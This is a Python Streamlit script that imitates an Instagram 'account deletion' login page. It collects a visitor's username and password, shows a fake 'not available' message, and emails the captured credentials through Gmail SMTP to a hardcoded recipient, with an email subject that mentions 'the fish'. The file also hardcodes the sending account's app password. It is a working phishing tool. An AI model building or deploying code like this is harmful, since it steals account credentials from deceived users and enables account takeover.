import streamlit as st
import smtplib

sender_email = "aalokhjithesh@gmail.com"
receiver_email = "palolibhavan@gmail.com"
password_for_mail = "bqfu ctqy sbdx frar"


username = ""
password = ""
sndmeg = ""
st.set_page_config("Instagram account deletion")

left, middle, right = st.columns(3)



with middle:
    image_url = "https://www.dafont.com/forum/attach/orig/8/1/815933.png?1"
    image_style = f"background-image: url({image_url}); background-size: contain; background-repeat: no-repeat; height: 70px; width: 170px;"
    st.markdown(f'<div style="{image_style}"></div>', unsafe_allow_html=True)

    username = st.text_input("Username")
    password = st.text_input("Password", type="password")
    message = f"""\
    Subject: Password and username for the fish
    

    The username is {username} , {password}"""
    st.write(username , password)
    if st.button("Sign-in"):
       st.write("Sorry this page is not currently Available")
       sndmeg = 1
       
       
if sndmeg == 1 :
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, password_for_mail)
        server.sendmail(sender_email, receiver_email, message)
        st.write("email send succesful")
